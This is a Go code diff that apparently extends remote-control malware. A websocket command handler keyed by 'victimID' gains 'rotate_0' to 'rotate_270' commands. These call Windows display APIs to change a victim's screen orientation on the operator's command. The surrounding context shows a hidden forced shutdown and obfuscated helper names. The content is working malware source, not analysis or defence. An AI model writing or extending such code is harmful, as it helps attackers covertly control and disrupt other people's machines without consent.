@@ -181,6 +181,63 @@ func runTaskC(command string) {
 	}()
 }
 
+func rotateScreen(angleDeg int) {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	user32 := syscall.NewLazyDLL(getUser32DLL())
+	enumDisplay := user32.NewProc("EnumDisplaySettingsW")
+	changeDisplay := user32.NewProc("ChangeDisplaySettingsExW")
+
+	const dmPelsWidth = 0x00080000
+	const dmPelsHeight = 0x00100000
+	const dmDisplayOrientation = 0x00000080
+	const enumCurrentSettings = 0xFFFFFFFF
+
+	type devmode struct {
+		_               [68]byte
+		DmSize          uint16
+		_               [6]byte
+		DmFields        uint32
+		_               [16]byte
+		DmOrientation   uint32
+		_               [4]byte
+		DmPelsWidth     uint32
+		DmPelsHeight    uint32
+		_               [104]byte
+	}
+
+	var dm devmode
+	dm.DmSize = uint16(unsafe.Sizeof(dm))
+
+	r, _, _ := enumDisplay.Call(0, uintptr(enumCurrentSettings), uintptr(unsafe.Pointer(&dm)))
+	if r == 0 {
+		return
+	}
+
+	var orient uint32
+	switch angleDeg {
+	case 90:
+		orient = 1
+	case 180:
+		orient = 2
+	case 270:
+		orient = 3
+	default:
+		orient = 0
+	}
+
+	curOrient := dm.DmOrientation
+	if (curOrient%2 == 0 && orient%2 != 0) || (curOrient%2 != 0 && orient%2 == 0) {
+		dm.DmPelsWidth, dm.DmPelsHeight = dm.DmPelsHeight, dm.DmPelsWidth
+	}
+	dm.DmOrientation = orient
+	dm.DmFields = dmPelsWidth | dmPelsHeight | dmDisplayOrientation
+
+	changeDisplay.Call(0, uintptr(unsafe.Pointer(&dm)), 0, 0, 0)
+}
+
 func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 	command = strings.TrimSpace(command)
 	if command == "" {
@@ -235,6 +292,23 @@ func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 				_ = cmdHidden(getShutdownExeName(), getShutdownPoweroffArg(), getShutdownTimeoutArg(), getShutdownZeroArg()).Start()
 			}()
 		}
+		return
+	}
+
+	if lower == "rotate_0" {
+		go rotateScreen(0)
+		return
+	}
+	if lower == "rotate_90" {
+		go rotateScreen(90)
+		return
+	}
+	if lower == "rotate_180" {
+		go rotateScreen(180)
+		return
+	}
+	if lower == "rotate_270" {
+		go rotateScreen(270)
 		return
 	}
 
